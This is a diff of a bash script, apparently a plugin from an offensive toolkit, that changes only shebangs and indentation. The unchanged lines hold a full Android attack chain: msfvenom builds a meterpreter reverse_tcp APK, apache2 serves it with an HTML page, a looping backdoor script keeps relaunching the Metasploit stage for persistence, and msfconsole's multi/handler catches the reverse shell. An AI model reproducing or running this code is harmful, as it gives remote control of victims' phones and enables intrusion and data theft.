@@ -1,14 +1,15 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 source "plugins/common_checks.sh"
 
-start_script() {  clear && echo -en "\n Starting ${ScriptName} ... "
+start_script() {
+  clear && echo -en "\n Starting ${ScriptName} ... "
 
   check_ipmd && sudo service apache2 start
 
   msfvenom -p android/meterpreter/reverse_tcp LHOST="${LHOST}" LPORT="${LPORT}" -o "${Apk_Path}"
 
-	cat >"${Index_Path}" <<-EOF
+  cat >"${Index_Path}" <<-EOF
 		<!DOCTYPE HTML>
 		<html>
 		<head>
@@ -18,14 +19,14 @@ start_script() {  clear && echo -en "\n Starting ${ScriptName} ... "
 	EOF
 
   cat >"${Backdoor_Path}" <<-EOF
-    #!/bin/bash
+    #!/usr/bin/env bash
     while :
     do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
       sleep 20
     done
 	EOF
 
-	cat >"${Meterpreter_Path}" <<-EOF
+  cat >"${Meterpreter_Path}" <<-EOF
 		use exploit/multi/handler
 		set PAYLOAD android/meterpreter/reverse_tcp
 		set LHOST ${LHOST}
@@ -40,8 +41,8 @@ start_script() {  clear && echo -en "\n Starting ${ScriptName} ... "
   msfconsole -q -r "${Meterpreter_Path}"
 }
 
-end_script() {  clear
-  echo -en "\n EXITING SCRIPT ... "
+end_script() {
+  clear && echo -en "\n EXITING SCRIPT ... "
 
   sudo rm -r "${Meterpreter_Path}"
   sudo rm -r "${Backdoor_Path}"
